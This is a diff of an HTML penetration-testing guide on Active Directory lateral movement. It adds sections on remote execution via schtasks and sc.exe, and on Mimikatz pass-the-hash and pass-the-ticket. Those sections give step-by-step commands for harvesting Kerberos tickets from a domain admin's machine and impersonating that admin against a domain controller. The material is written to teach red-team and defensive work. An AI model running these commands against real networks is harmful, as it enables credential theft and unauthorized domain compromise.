@@ -80,11 +80,14 @@
 <li><a class="reference internal" href="#metasploit-psexec">Metasploit psexec</a></li>
 <li><a class="reference internal" href="#sysinternals-psexec">Sysinternals psexec</a></li>
 <li><a class="reference internal" href="#task-scheduler">Task Scheduler</a></li>
+<li><a class="reference internal" href="#scheduled-tasks">Scheduled Tasks</a></li>
+<li><a class="reference internal" href="#service-controller-sc">Service Controller (SC)</a></li>
 <li><a class="reference internal" href="#remote-registry">Remote Registry</a></li>
 <li><a class="reference internal" href="#remote-file-access">Remote File Access</a></li>
 <li><a class="reference internal" href="#winrm">WinRM</a></li>
 <li><a class="reference internal" href="#wmi">WMI</a></li>
 <li><a class="reference internal" href="#dcom">DCOM</a></li>
+<li><a class="reference internal" href="#mimikatz-pth-ptt">Mimikatz PTH/ PTT</a></li>
 <li><a class="reference internal" href="#xfreerdp-remote-desktop">xfreerdp/ Remote Desktop</a></li>
 </ul>
 </li>
@@ -135,7 +138,7 @@
   <div class="section" id="learning-from-the-field-active-directory-recon-and-administrative-shells">
 <h1>Learning from the field : Active Directory Recon and Administrative shells<a class="headerlink" href="#learning-from-the-field-active-directory-recon-and-administrative-shells" title="Permalink to this headline">¶</a></h1>
 <p>Once, we have access to <strong>credentials of a domain user of windows domain</strong>, we can utilize the credentials to do windows <strong>active directory enumeration</strong> such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Diretory Topology Diagrammer etc.</p>
-<p>Also, once we have <strong>administrative credentials</strong> there are multiple ways to get a <strong>execute remote commands</strong> on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples.</p>
+<p>Also, once we have <strong>administrative credentials</strong> there are multiple ways to get a <strong>execute remote commands</strong> on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc. We have a look over all the methods with possible examples.</p>
 <p>Did we missed something? please send us a pull request and we will add it.</p>
 <div class="section" id="recon-active-directory">
 <h2>Recon Active Directory:<a class="headerlink" href="#recon-active-directory" title="Permalink to this headline">¶</a></h2>
@@ -1241,6 +1244,69 @@ C:\Users\test&gt;
 </pre></div>
 </div>
 </div>
+<div class="section" id="scheduled-tasks">
+<h3>Scheduled Tasks<a class="headerlink" href="#scheduled-tasks" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://technet.microsoft.com/en-us/library/cc725744(v=ws.11).aspx">Schtasks</a> Schedules commands and programs to run periodically or at a specific time. Adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks. Schtasks replaces At.exe, a tool included in previous versions of Windows. Although At.exe is still included in the Windows Server 2003 family, schtasks is the recommended command-line task scheduling tool.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">schtasks</span> <span class="o">/</span><span class="n">create</span> <span class="o">/</span><span class="n">sc</span> <span class="o">&lt;</span><span class="n">ScheduleType</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">/</span><span class="n">s</span> <span class="o">&lt;</span><span class="n">Computer</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">/</span><span class="n">u</span> <span class="p">[</span><span class="o">&lt;</span><span class="n">Domain</span><span class="o">&gt;</span>\<span class="p">]</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">/</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">Password</span><span class="o">&gt;</span><span class="p">]]]</span> <span class="p">[</span><span class="o">/</span><span class="n">ru</span> <span class="p">{[</span><span class="o">&lt;</span><span class="n">Domain</span><span class="o">&gt;</span>\<span class="p">]</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="o">|</span> <span class="n">System</span><span class="p">}]</span> <span class="p">[</span><span class="o">/</span><span class="n">rp</span> <span class="o">&lt;</span><span class="n">Password</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">mo</span> <span class="o">&lt;</span><span class="n">Modifier</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">Day</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="n">Day</span><span class="o">&gt;...</span><span class="p">]</span> <span class="o">|</span> <span class="o">*</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">m</span> <span class="o">&lt;</span><span class="n">Month</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="n">Month</span><span class="o">&gt;...</span><span class="p">]]</span> <span class="p">[</span><span class="o">/</span><span class="n">i</span> <span class="o">&lt;</span><span class="n">IdleTime</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">st</span> <span class="o">&lt;</span><span class="n">StartTime</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">ri</span> <span class="o">&lt;</span><span class="n">Interval</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[{</span><span class="o">/</span><span class="n">et</span> <span class="o">&lt;</span><span class="n">EndTime</span><span class="o">&gt;</span> <span class="o">|</span> <span class="o">/</span><span class="n">du</span> <span class="o">&lt;</span><span class="n">Duration</span><span class="o">&gt;</span><span class="p">}</span> <span class="p">[</span><span class="o">/</span><span class="n">k</span><span class="p">]]</span> <span class="p">[</span><span class="o">/</span><span class="n">sd</span> <span class="o">&lt;</span><span class="n">StartDate</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">ed</span> <span class="o">&lt;</span><span class="n">EndDate</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">it</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">z</span><span class="p">]</span> <span class="p">[</span><span class="o">/</span><span class="n">f</span><span class="p">]</span>
+
+<span class="o">/</span><span class="n">sc</span> <span class="o">&lt;</span><span class="n">ScheduleType</span><span class="o">&gt;</span>               <span class="p">:</span> <span class="n">Specifies</span> <span class="n">the</span> <span class="n">schedule</span> <span class="nb">type</span><span class="o">.</span> <span class="n">Valid</span> <span class="n">values</span> <span class="n">are</span> <span class="n">MINUTE</span><span class="p">,</span> <span class="n">HOURLY</span><span class="p">,</span> <span class="n">DAILY</span><span class="p">,</span> <span class="n">WEEKLY</span><span class="p">,</span> <span class="n">MONTHLY</span><span class="p">,</span> <span class="n">ONCE</span><span class="p">,</span> <span class="n">ONSTART</span><span class="p">,</span> <span class="n">ONLOGON</span><span class="p">,</span> <span class="n">ONIDLE</span><span class="o">.</span>
+<span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span>                   <span class="p">:</span> <span class="n">Specifies</span> <span class="n">a</span> <span class="n">name</span> <span class="k">for</span> <span class="n">the</span> <span class="n">task</span><span class="o">.</span>
+<span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span>                    <span class="p">:</span> <span class="n">Specifies</span> <span class="n">the</span> <span class="n">program</span> <span class="ow">or</span> <span class="n">command</span> <span class="n">that</span> <span class="n">the</span> <span class="n">task</span> <span class="n">runs</span><span class="o">.</span> <span class="n">Type</span> <span class="n">the</span> <span class="n">fully</span> <span class="n">qualified</span> <span class="n">path</span> <span class="ow">and</span> <span class="n">file</span> <span class="n">name</span> <span class="n">of</span> <span class="n">an</span> <span class="n">executable</span> <span class="n">file</span><span class="p">,</span> <span class="n">script</span> <span class="n">file</span><span class="p">,</span> <span class="ow">or</span> <span class="n">batch</span> <span class="n">file</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">omit</span> <span class="n">the</span> <span class="n">path</span><span class="p">,</span> <span class="n">schtasks</span> <span class="n">assumes</span> <span class="n">that</span> <span class="n">the</span> <span class="n">file</span> <span class="ow">is</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">SystemRoot</span>\<span class="n">System32</span> <span class="n">directory</span><span class="o">.</span>
+<span class="o">/</span><span class="n">s</span> <span class="o">&lt;</span><span class="n">Computer</span><span class="o">&gt;</span>                    <span class="p">:</span> <span class="n">Schedules</span> <span class="n">a</span> <span class="n">task</span> <span class="n">on</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">remote</span> <span class="n">computer</span><span class="o">.</span> <span class="n">Type</span> <span class="n">the</span> <span class="n">name</span> <span class="ow">or</span> <span class="n">IP</span> <span class="n">address</span> <span class="n">of</span> <span class="n">a</span> <span class="n">remote</span> <span class="n">computer</span> <span class="p">(</span><span class="k">with</span> <span class="ow">or</span> <span class="n">without</span> <span class="n">backslashes</span><span class="p">)</span><span class="o">.</span> <span class="n">The</span> <span class="n">default</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">local</span> <span class="n">computer</span><span class="o">.</span>
+<span class="o">/</span><span class="n">u</span> <span class="p">[</span><span class="o">&lt;</span><span class="n">Domain</span><span class="o">&gt;</span>\<span class="p">]</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span>             <span class="p">:</span> <span class="n">Runs</span> <span class="n">this</span> <span class="n">command</span> <span class="k">with</span> <span class="n">the</span> <span class="n">permissions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">user</span> <span class="n">account</span><span class="o">.</span> <span class="n">The</span> <span class="n">default</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">permissions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">current</span> <span class="n">user</span> <span class="n">of</span> <span class="n">the</span> <span class="n">local</span> <span class="n">computer</span><span class="o">.</span>
+<span class="o">/</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">Password</span><span class="o">&gt;</span>                    <span class="p">:</span> <span class="n">Provides</span> <span class="n">the</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span> <span class="n">specified</span> <span class="ow">in</span> <span class="n">the</span> <span class="o">/</span><span class="n">u</span> <span class="n">parameter</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">use</span> <span class="n">the</span> <span class="o">/</span><span class="n">u</span> <span class="n">parameter</span><span class="p">,</span> <span class="n">but</span> <span class="n">omit</span> <span class="n">the</span> <span class="o">/</span><span class="n">p</span> <span class="n">parameter</span> <span class="ow">or</span> <span class="n">the</span> <span class="n">password</span> <span class="n">argument</span><span class="p">,</span> <span class="n">schtasks</span> <span class="n">prompts</span> <span class="n">you</span> <span class="k">for</span> <span class="n">a</span> <span class="n">password</span> <span class="ow">and</span> <span class="n">obscures</span> <span class="n">the</span> <span class="n">text</span> <span class="n">you</span> <span class="nb">type</span>
+<span class="o">/</span><span class="n">ru</span> <span class="p">{[</span><span class="o">&lt;</span><span class="n">Domain</span><span class="o">&gt;</span>\<span class="p">]</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="o">|</span> <span class="n">System</span><span class="p">}</span> <span class="p">:</span> <span class="n">Runs</span> <span class="n">the</span> <span class="n">task</span> <span class="k">with</span> <span class="n">permissions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">user</span> <span class="n">account</span><span class="o">.</span> <span class="n">By</span> <span class="n">default</span><span class="p">,</span> <span class="n">the</span> <span class="n">task</span> <span class="n">runs</span> <span class="k">with</span> <span class="n">the</span> <span class="n">permissions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">current</span> <span class="n">user</span> <span class="n">of</span> <span class="n">the</span> <span class="n">local</span> <span class="n">computer</span><span class="p">,</span> <span class="ow">or</span> <span class="k">with</span> <span class="n">the</span> <span class="n">permission</span> <span class="n">of</span> <span class="n">the</span> <span class="n">user</span> <span class="n">specified</span> <span class="n">by</span> <span class="n">the</span> <span class="o">/</span><span class="n">u</span> <span class="n">parameter</span><span class="p">,</span> <span class="k">if</span> <span class="n">one</span> <span class="ow">is</span> <span class="n">included</span><span class="o">.</span> <span class="n">The</span> <span class="o">/</span><span class="n">ru</span> <span class="n">parameter</span> <span class="ow">is</span> <span class="n">valid</span> <span class="n">when</span> <span class="n">scheduling</span> <span class="n">tasks</span> <span class="n">on</span> <span class="n">local</span> <span class="ow">or</span> <span class="n">remote</span> <span class="n">computers</span><span class="o">.</span>
+<span class="o">/</span><span class="n">rp</span> <span class="o">&lt;</span><span class="n">Password</span><span class="o">&gt;</span>                   <span class="p">:</span> <span class="n">Provides</span> <span class="n">the</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span> <span class="n">that</span> <span class="ow">is</span> <span class="n">specified</span> <span class="ow">in</span> <span class="n">the</span> <span class="o">/</span><span class="n">ru</span> <span class="n">parameter</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">omit</span> <span class="n">this</span> <span class="n">parameter</span> <span class="n">when</span> <span class="n">specifying</span> <span class="n">a</span> <span class="n">user</span> <span class="n">account</span><span class="p">,</span> <span class="n">SchTasks</span><span class="o">.</span><span class="n">exe</span> <span class="n">prompts</span> <span class="n">you</span> <span class="k">for</span> <span class="n">the</span> <span class="n">password</span> <span class="ow">and</span> <span class="n">obscures</span> <span class="n">the</span> <span class="n">text</span> <span class="n">you</span> <span class="nb">type</span><span class="o">.</span> <span class="n">Do</span> <span class="ow">not</span> <span class="n">use</span> <span class="n">the</span> <span class="o">/</span><span class="n">rp</span> <span class="n">parameter</span> <span class="k">for</span> <span class="n">tasks</span> <span class="n">run</span> <span class="k">with</span> <span class="n">System</span> <span class="n">account</span> <span class="n">credentials</span> <span class="p">(</span><span class="o">/</span><span class="n">ru</span> <span class="n">System</span><span class="p">)</span><span class="o">.</span> <span class="n">The</span> <span class="n">System</span> <span class="n">account</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">have</span> <span class="n">a</span> <span class="n">password</span> <span class="ow">and</span> <span class="n">SchTasks</span><span class="o">.</span><span class="n">exe</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">prompt</span> <span class="k">for</span> <span class="n">one</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>Example:</p>
+<ul class="simple">
+<li>Create new task and execute it</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">schtasks</span> <span class="o">/</span><span class="n">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">foobar</span> <span class="o">/</span><span class="n">tr</span> <span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">temp</span>\<span class="n">foobar</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">sc</span> <span class="n">once</span> <span class="o">/</span><span class="n">st</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">/</span><span class="n">S</span> <span class="n">host</span> <span class="o">/</span><span class="n">RU</span> <span class="n">System</span>
+<span class="n">schtasks</span> <span class="o">/</span><span class="n">run</span> <span class="o">/</span><span class="n">tn</span> <span class="n">foobar</span> <span class="o">/</span><span class="n">S</span> <span class="n">host</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Delete the task after it is executed</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">schtasks</span> <span class="o">/</span><span class="n">F</span> <span class="o">/</span><span class="n">delete</span> <span class="o">/</span><span class="n">tn</span> <span class="n">foobar</span> <span class="o">/</span><span class="n">S</span> <span class="n">host</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="service-controller-sc">
+<h3>Service Controller (SC)<a class="headerlink" href="#service-controller-sc" title="Permalink to this headline">¶</a></h3>
+<p>Communicates with the Service Controller and installed services. SC.exe retrieves and sets control information about services. Armitage Hacker has mentioned this at his blog <a class="reference external" href="https://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/">Lateral Movement with High Latency</a></p>
+<ul class="simple">
+<li>Create a new service named foobar</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Start the service</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sc</span> \\<span class="n">host</span> <span class="n">start</span> <span class="n">foobar</span>
+</pre></div>
+</div>
+<p>The sc command requires an executable that responds to Service Control Manager commands. If you do not provide such an executable, your program will run, and then immediately exit.</p>
+</div></blockquote>
+<ul class="simple">
+<li>Delete the service after it runs</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sc</span> \\<span class="n">host</span> <span class="n">delete</span> <span class="n">foobar</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div>
 <div class="section" id="remote-registry">
 <h3>Remote Registry<a class="headerlink" href="#remote-registry" title="Permalink to this headline">¶</a></h3>
 <p>A command to be run or DLL to be loaded when specific events occur, such as boot or login or process execution, as active user or SYSTEM.</p>
@@ -1426,6 +1492,101 @@ At line:1 char:1
   +FullyQualifiedErrorID    : UnauthorizedAccessException
 </pre></div>
 </div>
+</div>
+<div class="section" id="mimikatz-pth-ptt">
+<h3>Mimikatz PTH/ PTT<a class="headerlink" href="#mimikatz-pth-ptt" title="Permalink to this headline">¶</a></h3>
+<p>If we do not have plaintext credentials, we can use NTLM hashes to get a shell</p>
+<ul class="simple">
+<li><strong>Pass the Hash</strong>:  Using a technique called Overpass-the-Hash we can take the NTLM hash and use it to obtain a Ticket Granting Ticket (TGT) via Kerberos\ Active Directory. With a TGT you can masquerade as the administrative user and access any domain resource that admin user has access to.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”
+</pre></div>
+</div>
+<p>A new command prompt session opens. This new command prompt injected Admin user credentials into it!</p>
+<p>This can be verified by checking</p>
+<ul class="simple">
+<li>If we have access to the C drive of the remote machine</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>dir \\remote-machine\c$
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Inspect tickets in Overpass-the-hash command prompt: From the new command prompt that opened from the Overpass-the-hash attack, execute the following:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">klist</span>
+</pre></div>
+</div>
+<p>We should be able to see the ticket of the admin user.</p>
+</div></blockquote>
+</div></blockquote>
+<ul class="simple">
+<li><strong>Pass the ticket</strong></li>
+</ul>
+<blockquote>
+<div><p>Let&#8217;s assume, we got credentials of Local Admin A, by which we can login in to the machine on which Domain Admin is logged on. We would utilize pass the ticket for this</p>
+<ul class="simple">
+<li>Harvest Credentials</li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li>Execute Mimikatz against Admin-PC ( on which domain admin is logged on )</li>
+</ul>
+<blockquote>
+<div><p>From the new command prompt, running in the context of admin user, go to the part of the filesystem where Mimikatz is located from that library. Run the following commands:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>xcopy mimikatz \\admin-pc\c$\temp
+</pre></div>
+</div>
+<p>Next, execute MimiKatz remotely to export all Kerberos tickets from Admin-PC:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>psexec.exe \\admin-pc -accepteula cmd /c (cd c:\temp ^&amp; mimikatz.exe “privilege::debug”   “sekurlsa::tickets /export” ^&amp; “exit”)
+</pre></div>
+</div>
+<p>Copy these tickets back to Victim-PC:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>xcopy \\admin-pc\c$\temp c:\temp\tickets
+</pre></div>
+</div>
+<p>We successfully executed Mimikatz remotely, exporting all Kerberos tickets from Admin-PC. We copied back the results to Victim-PC, and now has one of the Domain Admin credentials without having to exploit his computer!</p>
+</div></blockquote>
+<ul class="simple">
+<li>Locate the Domain Admin user TGT</li>
+</ul>
+<blockquote>
+<div>Locate the kirbi files which are not Domain Admin user (i.e. “ADMIN-PC$”). Delete those and keep the Domain Admin user tickets.</div></blockquote>
+<ul>
+<li><p class="first">Pass-the-Ticket</p>
+<p>We can pass the Domain Admin User tickets, literally, into memory and use them to gain access to resources as if you were Domain Admin. The attacker is ready to import them into Victim-PC’s memory, to get the credentials to access sensitive resources.</p>
+<p>From an elevated command prompt, where Mimikatz is located on the filesystem, execute the following:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>mimikatz.exe “privilege::debug” “kerberos::ptt c:\temp\tickets” “exit”
+</pre></div>
+</div>
+<p>Ensure that the <a class="reference external" href="mailto:DomainAdminUser&#37;&#52;&#48;krbtgt-Domainname">DomainAdminUser<span>&#64;</span>krbtgt-Domainname</a> tickets were successfully imported. Now, let’s validate that the right tickets are in the command prompt session.</p>
+</li>
+<li><p class="first">Validate the ticket was imported</p>
+</li>
+</ul>
+<blockquote>
+<div><p>Execute the following in the same elevated command prompt:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">klist</span>
+</pre></div>
+</div>
+<p>The attacker now successfully imported the harvested ticket into the session, and will now leverage their new privilege and access to access the domain controller’s C drive</p>
+</div></blockquote>
+<ul class="simple">
+<li>Access contents of dc1c$ with DomainAdminUser credential</li>
+</ul>
+<blockquote>
+<div><p>Execute the following in the same command prompt to which the tickets were just imported.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>dir \\dc1\c$
+</pre></div>
+</div>
+<p>The attacker is now, for all intents and purposes, DomainAdminUser, in the digital world. Only administrators should be able to access the root of the domain controller. The attacker is using legitimate credentials, can access legitimate resources and executing legitimate executables.</p>
+</div></blockquote>
+</div></blockquote>
+</div></blockquote>
+<p>Both Mimikatz PTH, PTT has been taken from the Microsoft <a class="reference external" href="https://gallery.technet.microsoft.com/Advanced-Threat-Analytics-8b0a86bc">Advanced Threat Analytics Attack Simulation Playbook</a></p>
 </div>
 <div class="section" id="xfreerdp-remote-desktop">
 <h3>xfreerdp/ Remote Desktop<a class="headerlink" href="#xfreerdp-remote-desktop" title="Permalink to this headline">¶</a></h3>
